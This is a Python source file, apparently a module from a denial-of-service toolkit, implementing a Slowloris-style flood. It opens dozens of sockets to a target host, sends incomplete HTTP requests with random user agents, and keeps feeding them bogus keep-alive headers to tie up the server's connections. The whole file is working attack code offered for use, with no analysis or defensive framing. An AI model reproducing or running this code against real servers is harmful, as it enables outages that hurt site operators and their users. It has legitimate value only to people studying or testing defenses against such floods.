# Import modules
import random
import socket
from bin.addons.utils import random_useragent
from colorama import Fore
from stringcolor import *

red = "#ff0033"
green = "#02f93c"
yellow = "#eefc32"
blue = "\033[38;5;51m"

# Init socket


def create_socket(target):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((target[0], target[1]))

        sock.send(
            "GET /?{} HTTP/1.1\r\n".format(random.randint(0,
                                                          2000)).encode("utf-8")
        )
        sock.send(
            "User-Agent: {}\r\n".format(random_useragent()).encode("utf-8")
        )
        sock.send("{}\r\n".format(
            "Accept-language: en-US,en,q=0.5").encode("utf-8"))

    except socket.timeout:
        print(
            f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('Timed out', yellow)}")
    except socket.error:
        print(
            f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('Failed create socket', yellow)}")
    else:
        print(f"{cs(f'[✔]', green)} {cs('Socket created...', yellow)}")
        return sock


def flood(target):
    # Create sockets
    sockets = []
    for _ in range(random.randint(20, 60)):
        sock = create_socket(target)
        if not sock:
            continue
        sockets.append(sock)
    # Send keep-alive headers
    for _ in range(4):
        for index, sock in enumerate(sockets):
            try:
                sock.send(
                    "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            except socket.error:
                print(
                    f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('Failed to send keep-alive headers', yellow)}")
                sockets.remove(sock)
            else:
                header = '{}:{}'.format(*target)
                print(
                    f"\033[1m{cs('[✔] SUCCESS', green)}\033[0m {cs(f'Sending keep-alive headers to', yellow)} {blue}{header}\033[0m {cs(f'from socket {index + 1}.', yellow)}")
